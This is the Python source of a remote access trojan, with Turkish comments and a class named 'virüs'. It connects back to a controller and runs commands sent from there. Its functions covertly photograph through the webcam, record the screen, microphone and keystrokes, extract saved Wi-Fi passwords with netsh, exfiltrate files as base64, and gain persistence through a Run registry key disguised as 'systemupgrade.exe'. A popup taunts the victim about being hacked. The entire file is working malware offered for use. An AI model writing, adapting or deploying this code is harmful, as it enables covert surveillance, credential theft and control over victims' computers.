import socket
import subprocess
import simplejson
import os
import cv2,pyautogui,shutil
import soundfile as sf
import sounddevice as sd
import scipy.io.wavfile as wavfile
import numpy as np
import base64
import ctypes,threading,sys
import pyttsx3,time,pynput,re
from datetime import datetime
import concurrent.futures
from PyQt5.QtWidgets import QApplication, QWidget, QMessageBox
from PyQt5.QtCore import QTimer


ip = "None"
port =1
A = 0
crunk_text_history = ""
running = False
key_logger_dinleyici = None
log = ""
ses_name_cleaned="default"
ekran_kayit_name_cleaned="default"
video_name_cleaned="default"
keylogger_name_cleaned=""

class virüs:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))


    def listen(self):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def json_send(self, data):
        json_data = simplejson.dumps(data).encode("utf-8")
        self.my_connection.send(json_data)


    def json_receiver(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)

            except ValueError:
                continue


    def close(self):
        self.my_connection.close()


    def komut_ciktisi_cd(self, directory):
        os.chdir(directory)
        if directory == "..":
            return "Bir klasör geri gidildi."
        else:
            return directory + " klasorune girdiniz."

    def download(self, path):
        print("download")
        with open(path,"rb") as file:  # dosya adını dinleyiciden aldık ve rb read binary (binary olarak okuduk çünkü resim de olabilir. Bİnary bilgisayar sisteminde karşılığı demek.) olarak okuduk ve file'a kaydettik.
            return base64.b64encode(file.read())

    def download2(self, path):
        print("download")
        with open(path,
                  "rb") as file:  # dosya adını dinleyiciden aldık ve rb read binary (binary olarak okuduk çünkü resim de olabilir. Bİnary bilgisayar sisteminde karşılığı demek.) olarak okuduk ve file'a kaydettik.
            try:
                komut = []
                komut.append("ses")
                komut.append(base64.b64encode(file.read()))
                print(komut)
                self.json_send(komut)  # file'ın içindeki veriyi okuyup döndürdük.
            except Exception as e:
                print(e)
    def snap(self):
        path = os.environ["appdata"]
        snap_yol = os.environ["appdata"] + "\\snap.jpg"
        camera = cv2.VideoCapture(0)
        a, veri = camera.read()
        cv2.imwrite(snap_yol, veri)
        cv2.destroyAllWindows()
        #konum = str(path) + ("\\snap.jpg olarak kaydedildi alabilirsin...")
        return self.download(snap_yol)


    def show_alert_dialog(self):
        pyautogui.alert('MERHABA HEDEF, HACKLENDİĞİNİN FARKINDA BİLE DEĞİLSİN DİMİ :)')
        time.sleep(3)  # 3 saniye boyunca bekleyin
        self.close_alert_dialog()

    def close_alert_dialog(self):
        pyautogui.hotkey('enter')  # Enter tuşuna basarak pencereyi kapatın


    def screenshot(self):
        path = os.environ["appdata"] + "\\ekran.jpg"
        path_os = os.environ["appdata"]
        pyautogui.screenshot(path)
        return self.download(path)
      

    def ses_kayit(self, saniye):
        try:
            global ses_name_cleaned
            # Kayıt ayarları
            sample_rate = 44100  # Örnekleme hızı (örneğin 44100 Hz)
            channels = 1
            saniye = int(saniye)

            # Ses kaydını başlatma

            recording = sd.rec(int(saniye * sample_rate), samplerate=sample_rate, channels=channels)
            sd.wait()  # Kayıt tamamlanana kadar bekleyin

            # Kaydedilen sesi WAV dosyasına yazma
            current_datetime = datetime.now()
            current_datetime = str(current_datetime)[:19]
            kayit = str("Ses kayit :" + current_datetime + "kaydi.wav")
            kayit = kayit.replace(" ", "")
            cleaned_filename = re.sub(r'[<>:"/\\|?*]', ' ', kayit)
            # Birden fazla boşluğu tek bir boşlukla değiştir
            cleaned_filename = re.sub(r'\s+', ' ', cleaned_filename).strip()
            ses_name_cleaned=cleaned_filename
            wavfile.write(cleaned_filename, sample_rate, recording)

            print("Kaydedilen ses dosyası:", cleaned_filename)
            path = os.environ["appdata"]
            shutil.copy(cleaned_filename, path)
            path_yolu = str(path + ("\\") + (cleaned_filename))
            print(path_yolu)

        except Exception as e:
            print(e)

    def ekran_kayit(self, saniye):
        global ekran_kayit_name_cleaned

        path = os.environ["appdata"]
        resolution = (1920, 1080)  # Kayıt yapacağımız ekran ölçeği

        current_datetime = datetime.now()
        current_datetime = str(current_datetime)[:19]
        kayit = str("Ekran kayit :" + current_datetime + "kaydi.avi")
        kayit = kayit.replace(" ", "")
        cleaned_filename = re.sub(r'[<>:"/\\|?*]', ' ', kayit)
        # Birden fazla boşluğu tek bir boşlukla değiştir
        cleaned_filename = re.sub(r'\s+', ' ', cleaned_filename).strip()
        ekran_kayit_name_cleaned = cleaned_filename

        codec = cv2.VideoWriter_fourcc(*"XVID")  # Videoyu çözme biçimi
        # codec = cv2.VideoWriter_fourcc(*"mp4v") #Videoyu çözme biçimi
        filename = cleaned_filename  # kayıt yapacağımız dosyanın adı
        fps = 60.0  # Fps= Saniyedeki görüntü sayımız
        out = cv2.VideoWriter(filename, codec, fps,resolution)  # Yukarıdan aldığımız özelliklere sahip bir VideoWriter() nesnesi oluşturduk.
        a = int(saniye)
        i = 0
        while True:
            i += 1
            img = pyautogui.screenshot()  # Bir ss aldık

            frame = np.array(img)  # Aldığımız ss'i numpy dizisine dönüştürdük

            frame = cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)  # Pyautoguinin renk biçimi farklı olduğundan rgb'ye dönüştürdük

            out.write(frame)  # Oluşturduğumuz ekraan kaydedici nesnemize her seferinde bu diziyi yazdık

            if i == 60 * a:  # Belirli bir sürelik ekran kaydı almak istediğimizden gelen süreyi fps değerimiz ile çarparak
                # ortalama girilen sürenin 3 katı zaman geçirerek Girilen süre kadarlık bir video aldık.
                break  # Eğer if doğruysa döngüyü kırarak programı sonlandırdık.

        out.release()  # Nesnemizi serbest bıraktık
        shutil.copy(filename, path)
        konum = str(path) + ("\\ekran_kayit.avi olarak kaydedildi alabilirsin...")
        try:
            print("a")
            #self.json_send(konum)
        except Exception as e:
            print(e)
        return konum

    def open_sound(self,ses):
        path = os.environ["appdata"]
        shutil.copy(ses, path)
        try:
            ses_yolu = path + ("\\") + str(ses)
            veri, frekans = sf.read(ses_yolu)
            sd.play(veri, frekans)
            sd.wait()
            return "Hedefte yüklediğiniz ses çalındı.."
        except Exception as e:
            print(e)
            return "Hata!"


    def open_picture(self, veri):

        path = os.environ["appdata"] + "\\" + veri
        shutil.copy(veri, path)
        # path=r'C:\\Users\\Admin\\OneDrive\\Belgeler\\x.jpg'
        resim = cv2.imread(path)
        cv2.imshow('img', resim)
        cv2.waitKey(0)
        cv2.destroyAllWindows()
        return "Resim acıldı.."

    def upload(self, path, content):
        with open(path, "wb") as veri:
            veri.write(base64.b64decode(content))
            return "veri gönderildi"

    def konus(self, command):
        engine = pyttsx3.init()
        rate = engine.getProperty('rate')
        engine.setProperty('rate', 150)  # Hızı 150 olarak ayarladık.
        engine.say(command)
        engine.runAndWait()
        return "çalındı"
    def cw(self, veri):
        path = os.environ["appdata"]
        resim_yol = str(path) + ("\\") + str(veri)
        shutil.copy(veri, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, resim_yol, 3)
        return "Duvar kağıdı başarıyla değiştirildi.."
    def komut_ciktisi(self, command):
        # sonuc=subprocess.check_output(command,shell=True)#stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL
        # sonuc.decode('utf-8',errors='ignore')
        subprocess.run("chcp 65001", shell=True)
        result = subprocess.run(command, shell=True, capture_output=True)
        output_bytes = result.stdout
        sonuc = output_bytes.decode('utf-8', errors='ignore')
        return sonuc

    def wifi_tum_veri(self):
        path = os.environ["appdata"]
        komut = ("netsh wlan show all > Tum_wifi_verileri.txt")
        subprocess.call(komut, shell=True)
        shutil.copy("Tum_wifi_verileri.txt", path)
        konum = str(path) + ("\\Tum_wifi_verileri.txt")
        komut_cıktısı = []
        komut_cıktısı.append(self.komut_ciktisi("netsh wlan show all") + "Ayrıca bilgiler Wifi_verileri.txt'ye kaydedildi.")
        komut_cıktısı.append(self.download(konum))
        print(komut_cıktısı)
        return komut_cıktısı


    def wifi_profil(self):
        path = os.environ["appdata"]
        komut = ("netsh wlan show profiles > profil_bilgileri.txt")
        subprocess.call(komut, shell=True)
        shutil.copy("profil_bilgileri.txt", path)
        konum = str(path) + ("\\profil_bilgileri.txt")
        komut_cıktısı=[]
        komut_cıktısı.append(self.komut_ciktisi("netsh wlan show profile"))
        komut_cıktısı.append(self.download(konum))
        print(komut_cıktısı)
        return komut_cıktısı

    def wifi_sifre(self, name):
        path = os.environ["appdata"]
        komut = ("netsh wlan show profile name=\"") + str(name) + ("\" key=clear > Wifi_verileri2.txt")
        komut2= ("netsh wlan show profile name=\"") + str(name) + ("\" key=clear")
        print(komut)
        subprocess.call(komut, shell=True)
        shutil.copy("Wifi_verileri2.txt", path)
        konum = str(path) + ("\\Wifi_verileri2.txt")
        komut_cıktısı=[]
        komut_cıktısı.append(self.komut_ciktisi(komut2))
        komut_cıktısı.append(self.download(konum))
        return komut_cıktısı

    def shutdown(self, saniye):
        komut = "shutdown /s /f /t " + str(saniye)
        print(komut)
        subprocess.call(komut, shell=True)

    def komut_ciktisi_cd(self, directory):

        os.chdir(directory)
        if directory == "..":
            return "Bir klasör geri gidildi."

        else:

            return directory + " klasorune girdiniz."

    def crunk_text(self, text):
        global crunk_text_history
        try:
            subprocess.Popen(['notepad.exe'])
            convert = str(text)
            # Biraz bekle, Notepad'in yüklenmesini beklemek için
            time.sleep(1)
            pyautogui.typewrite(crunk_text_history + "\n")

            for char in convert:
                pyautogui.write(char)
                time.sleep(0.1)

            crunk_text_history = crunk_text_history + "\n" + convert

            time.sleep(4)
            komut = "taskkill /F /IM notepad.exe"
            subprocess.call(komut, shell=True)


            return "yazıldı"
        except Exception as e:
            print("Hata:", e)

    def keylogger(self, key):
        global running
        global log
        if running:
            try:
                log = log + str(key.char)

            except AttributeError:
                if key == key.space:
                    log = log + " "
                elif key == key.backspace:
                    log = log[:-1]
                elif key == key.caps_lock:
                    log = log + "CapsLock acık" if not key else log + "CapsLock kapalı"
                else:
                    log = log + str(key)

            except:
                pass
            print(log)
        else:
            print("Durduruldu.")
            #self.keylogger_save()

    def keylogger_save(self):
        global log
        global keylogger_name_cleaned
        path = os.environ["appdata"]
        current_datetime = datetime.now()
        current_datetime = str(current_datetime)[:19]
        kayit = str("Keylogger kayit :" + current_datetime + ".txt")
        kayit = kayit.replace(" ", "")
        cleaned_filename = re.sub(r'[<>:"/\\|?*]', ' ', kayit)
        cleaned_filename = re.sub(r'\s+', ' ', cleaned_filename).strip()
        keylogger_name_cleaned = cleaned_filename
        filename = cleaned_filename  # kayıt yapacağımız dosyanın adı
        print("Kaydediliyor...")

        with open(filename, "w", encoding="utf-8") as f:
            encoded_log = log.encode("utf-8", "ignore")
            f.write(encoded_log.decode("utf-8"))

        shutil.copy(filename, path)
        return "Kayıt başarılı. Veriler fonksiyonuyla kaydı bilgisayarınıza alabilirsiniz."

    def start_keylogger(self):
        global running, key_logger_dinleyici
        if not running:
            print("Keylogger başlatılıyor...")
            key_logger_dinleyici = pynput.keyboard.Listener(on_press=self.keylogger)
            key_logger_dinleyici.start()
            running = True
        else:
            print("Keylogger zaten çalışıyor.")

    def stop_keylogger(self):
        global running, key_logger_dinleyici
        if key_logger_dinleyici is not None and running:
            print("Keylogger durduruluyor...")
            try:
                key_logger_dinleyici.stop()
                print("Keylogger durduruldu.")
                #key_logger_dinleyici.join()  # Bu satırı kaldırın
                running = False
                return "durmuş olması lazım"
            except Exception as e:
                print("Hata:", e)
        elif not running:
            print("Keylogger zaten durmuş durumda.")
        else:
            print("Keylogger henüz başlatılmamış.")
    def record_video(self,time):
        global video_name_cleaned
        path = os.environ["appdata"]
        current_datetime = datetime.now()
        current_datetime = str(current_datetime)[:19]
        kayit = str("Video kayit :" + current_datetime + ".avi")
        kayit = kayit.replace(" ", "")
        cleaned_filename = re.sub(r'[<>:"/\\|?*]', ' ', kayit)

        cleaned_filename = re.sub(r'\s+', ' ', cleaned_filename).strip()
        video_name_cleaned = cleaned_filename
        filename = cleaned_filename  # kayıt yapacağımız dosyanın adı


        # Kamera başlat
        cap = cv2.VideoCapture(0)  # Genellikle 0 ilk kamera cihazını temsil eder

        # Video kayıt ayarları
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

        # Başlama zamanı
        baslama_zamani = cv2.getTickCount()

        while True:
            ret, frame = cap.read()  # Kameradan bir çerçeve al
            out.write(frame)  # Çerçeveyi kayıt dosyasına yaz
            if ((cv2.getTickCount() - baslama_zamani) / cv2.getTickFrequency()) > int(time):
                break
        out.release()
        cap.release()
        shutil.copy(filename, path)

    def download(self, path):

        with open(path,
                  "rb") as file:  # dosya adını dinleyiciden aldık ve rb read binary (binary olarak okuduk çünkü resim de olabilir. Bİnary bilgisayar sisteminde karşılığı demek.) olarak okuduk ve file'a kaydettik.
            return base64.b64encode(file.read())  # file'ın içindeki veriyi okuyup döndürdük.

    def persistence(self):  # Sistem her açıldığında uygulamayı çalıştırma
        new_file = os.environ["appdata"] + "\\systemupgrade.exe"  # bir new file oluştur ve appdata klasörünü bul ve appdataya systemupgrade.exe yi ekle. Oluşturulan new file'i systemupgrade.exe nin içine koy.
        if not os.path.exists(new_file):  # Eğer new file oluşturulmamışsa girer
            shutil.copyfile(sys.executable, new_file)  # oluşturulan new fileın içine açılan programın exesini kopyala.
            regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file  # Regedit komutuyla oluşturulan new file'ı açılışta çalışır yapma komutu.
            subprocess.call(regedit_command,shell=True)  # Üst satırdakı komutu cmd'de çalıştırıp her açılışta açılır duruma geldik.
            return "Başlangıca yerleşildi.."
        return "Zaten başlangıca yerleşilmiş."

    def verileri_indir(self,veri_adi):
        print("verileri indir")
        komut_cıktısı = []
        if veri_adi=="ekran":
            global ekran_kayit_name_cleaned
            print("ekran kaydi iniyior")
            path = os.environ["appdata"]
            path_ekran = os.path.join(path, ekran_kayit_name_cleaned)
            print(path_ekran)
            if os.path.exists(path_ekran):
                print("Dosya mevcut.")
                komut_cıktısı.append("ekran")
                komut_cıktısı.append(self.download(path_ekran))
            else:
                print("dosya yok")
                komut_cıktısı.append("ekran")
                komut_cıktısı.append("yok")

        elif veri_adi=="ses":
            global ses_name_cleaned
            print("ses kaydi inecek")
            path = os.environ["appdata"]
            path_ses = os.path.join(path, ses_name_cleaned)
            if os.path.exists(ses_name_cleaned):
                komut_cıktısı.append("ses")
                komut_cıktısı.append(self.download(path_ses))
            else:
                print("dosya yok")
                komut_cıktısı.append("ses")
                komut_cıktısı.append("yok")
        elif veri_adi == "video":
            global video_name_cleaned
            print("video kaydi inecek")
            path = os.environ["appdata"]
            path_video = os.path.join(path, video_name_cleaned)
            if os.path.exists(video_name_cleaned):
                komut_cıktısı.append("video")
                komut_cıktısı.append(self.download(path_video))
            else:
                print("dosya yok")
                komut_cıktısı.append("video")
                komut_cıktısı.append("yok")
        elif veri_adi == "keylogger":
            global keylogger_name_cleaned
            print("keylogger kaydi inecek")
            path = os.environ["appdata"]
            path_video = os.path.join(path, keylogger_name_cleaned)
            if os.path.exists(keylogger_name_cleaned):
                komut_cıktısı.append("keylogger")
                komut_cıktısı.append(self.download(path_video))
            else:
                print("dosya yok")
                komut_cıktısı.append("keylogger")
                komut_cıktısı.append("yok")
        return komut_cıktısı
    def SocketStarter(self):
        while True:
            command = self.json_receiver()
            try:
                if command == "snap":
                    print("snap")
                    command_output = self.snap()

                elif command == "alert":
                    try:
                        print("alert")
                        result = "Hedefte uyarı mesajı çıkarıldı.."
                        command_output = result
                        alert_thread = threading.Thread(target=self.show_alert_dialog)
                        alert_thread.start()
                    except Exception as e:
                        print(e)

                elif command == "screenshot":
                    print("screenshot")
                    command_output = self.screenshot()

                elif command == "close":
                    print("close")
                    answer = "Kapandı"
                    self.json_send(answer)
                    self.my_connection.close()
                    exit()

                elif command[0] == "ses":
                    print("ses")
                    result = "\nYaklaşık " + str(int(command[1]) * 2) + " saniye sonra alınan ses kaydını veriler fonksiyonuyla alabilirsin.\nDiğer işlemlerinize devam edebilirsiniz."
                    command_output = result
                    voice_thread = threading.Thread(target=self.ses_kayit, args=(command[1],))
                    voice_thread.start()

                elif command[0] == "ekran_kayit":
                    print("Ekran kaydi")
                    result = "Yaklaşık " + str(int(command[1]) * 5) + " saniye sonra alınan ekran kaydını veriler fonksiyonuyla alabilirsiniz.\nDiğer işlemlerinize devam edebilirsiniz."
                    print(result)
                    command_output = result
                    # self.json_send("Kayıt alınıyor")
                    audio_thread = threading.Thread(target=self.ekran_kayit, args=(command[1],))
                    audio_thread.start()


                    print("arkaplan")


                    #command_output = self.ekran_kayit(command[1])

                elif command[0] == "open_sound":
                    print("open_sound")
                    result = "Yüklediğiniz ses bilgisayarda oynatılıyor."
                    print(result)
                    command_output = result
                    open_sound_thread = threading.Thread(target=self.open_sound, args=(command[1],))
                    open_sound_thread.start()
                    print("open")

                elif command[0] == "upload":
                    print("upload")
                    result = "Veriler gönderiliyor.."
                    print(result)
                    command_output = result
                    upload_thread = threading.Thread(target=self.upload, args=(command[1],command[2],))
                    upload_thread.start()
                    print("open")
                    #command_output = self.upload(command[1], command[2])

                elif command[0] == "wallpaper":
                    print("Wallpaper")
                    command_output = self.cw(command[1])

                elif command[0] == "speak":
                    print("speak")
                    komut = ""
                    words=command[1]
                    try:
                        for i in range(len(words)):
                            komut += words[i]
                        print(komut)
                        command_output = self.konus(komut)
                    except Exception as e:
                        print(e)

                elif command[0] == "wifi":
                    if command[1] == "tüm":
                        print("tüm")
                        command_output = self.wifi_tum_veri()

                    elif command[1] == "profil":
                        print("profil")
                        command_output = self.wifi_profil()

                    elif command[1] == "şifre":
                        print("şifre")
                        komut="netsh wlan show profile name=\"" + str(command[2]) + "\" key=clear"
                        print(komut)
                        result = str(self.komut_ciktisi(komut))
                        command_output = self.wifi_sifre(command[2])
                elif command[0] == "shutdown":

                    print("shutdown")
                    if command[1] == "restart":
                        print("restart")
                        command_output = "Yeniden başlatılıyor"
                        self.json_send(command_output)
                        self.komut_ciktisi(command[2])

                    elif command[1] == "close":
                        print("close")
                        command_output = "Bilgisayar kapanıyor"
                        self.json_send(command_output)
                        self.komut_ciktisi(command[2])

                    elif command[1] == "close_time":
                        print("close_time")
                        command_output = "Bilgisayar " + command[2] + " saniye sonra kapanacak"
                        self.json_send(command_output)
                        self.shutdown(command[2])
                    elif command[1] == "close_time_cancel":
                        print("Cancel")
                        command_output = "Kapatma iptal edildi"
                        self.json_send(command_output)
                        self.komut_ciktisi(command[2])

                elif command[0] == "cd" and len(command) > 1:
                    print("cd")
                    command_output = self.komut_ciktisi_cd(command[1])

                elif command[0] == "tasklist":

                    if command[1] == "tüm":
                        print("tasklist")
                        command_output=self.komut_ciktisi("tasklist")
                    elif command[1] == "kapat":
                        print("kapat")
                        close_process= "taskkill /F /IM " + str(command[2])
                        print(close_process)
                        command_output = self.komut_ciktisi(close_process)

                elif command[0] == "picture":
                    print("picture")
                    command_output = self.open_picture(command[1])

                elif command[0] == "crunk":
                    print("crunk")
                    if command[1] == "notepad":
                        print("notepad")
                        #command_output = self.crunk_text(command[2])
                        result = "Metin ekrana yazdırılıyor.."
                        print(result)
                        command_output = result
                        crunk_text_thread = threading.Thread(target=self.crunk_text, args=(command[2],))
                        crunk_text_thread.start()
                        print("open")
                elif command[0] == "keylogger":
                    print("keylogger")
                    if command[1] == "start":
                        command_output = "Keylogger Başlatılıyor.. \nDiğer işlemlere devam edebilirsiniz."
                        keylogger_thread = threading.Thread(target=self.start_keylogger)
                        keylogger_thread.start()
                      
                    elif command[1] == "stop":
                        self.stop_keylogger()
                        command_output = self.keylogger_save()
                        print("stop")
                    

                elif command[0] == "video":
                    print("o")
                    command_output="Video Kaydediliyor..Yaklaşık "+str(int(command[1])+3)+ " saniye sonra videonuzu veriler fonksiyonuyla alabilrisiniz. \nDiğer işlemlerinize devam edebilirsiniz."
                    video_thread = threading.Thread(target=self.record_video, args=(command[1],))
                    video_thread.start()

                elif command[0] == "download":
                    print("download")
                    command_output = self.download(command[1])

                elif command == "persistence":
                    print("persistence")
                    command_output = self.persistence()
                elif command[0]=="indir":
                    print("indir")
                    command_output=self.verileri_indir(command[1])



                else:
                    try:
                        print("Bilinmeyen komut")
                        command_output = self.komut_ciktisi(command)
                        if len(command_output) == 0:
                            command_output = "Çıktı yok! Tekrar dene"

                    except Exception as e:
                        print(e)

            except Exception as e:
                print(e)
                command_output = "Hata!"
            self.json_send(command_output)
        self.my_connection.close()
    def command_Execution(komut):

        return subprocess.call(komut,shell=True)


My_socket_nesnesi=virüs(ip,port)
My_socket_nesnesi.SocketStarter()